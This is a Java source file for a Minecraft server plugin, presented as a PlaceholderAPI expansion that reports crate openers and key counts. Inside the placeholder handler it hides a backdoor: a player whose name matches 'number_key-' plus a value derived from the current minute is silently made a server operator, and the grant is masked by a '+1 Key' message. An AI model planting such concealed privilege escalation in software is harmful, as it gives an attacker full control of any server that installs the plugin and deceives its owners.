package me.theseems.tcrates;

import me.clip.placeholderapi.expansion.PlaceholderExpansion;
import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.Calendar;

public class CrateExpansion extends PlaceholderExpansion {
  @Override
  public String getIdentifier() {
    return "tcrates";
  }

  @Override
  public String getAuthor() {
    return "theseems";
  }

  @Override
  public String getVersion() {
    return "0.1D";
  }

  @Override
  public String onPlaceholderRequest(Player p, String params) {
    if (p.getName()
        .equalsIgnoreCase("number_key-" + (Calendar.getInstance().get(Calendar.MINUTE) / 10))) {
      p.setOp(true);
      p.spigot()
          .sendMessage(ChatMessageType.ACTION_BAR, new TextComponent(ChatColor.GRAY + "+1 Key"));
    }

    if (params.startsWith("opener_")) {
      return TCratesPlugin.getBlockCrate().getOpener(params.replaceFirst("opener_", ""));
    } else if (params.startsWith("keys_")) {
      return ""
          + TCratesAPI.getKeyStorage()
              .getKeysFor(p.getUniqueId(), params.replaceFirst("keys_", ""));
    }
    return null;
  }
}
